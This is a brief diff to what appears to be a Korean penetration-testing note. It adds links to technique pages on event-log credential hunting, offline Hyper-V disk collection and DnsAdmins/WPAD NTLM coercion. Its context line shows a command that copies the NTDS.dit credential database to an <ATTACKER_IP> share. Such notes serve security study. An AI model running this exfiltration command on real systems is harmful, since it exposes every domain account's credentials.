@@ -83,3 +83,6 @@ Copy-Item C:\NTDS\NTDS.dit \\<ATTACKER_IP>\CompData\NTDS.dit
 - [[WinRM 원격 PowerShell 세션]]
 - [[Windows 파일 자격증명 검색]]
 - [[LSASS 메모리 덤프]]
+- [[Windows 이벤트 로그에서 민감 명령줄 검색]]
+- [[Hyper-V VM 내보내기와 가상 디스크 오프라인 수집]]
+- [[DnsAdmins WPAD DNS 레코드로 NTLM 인증 유도]]
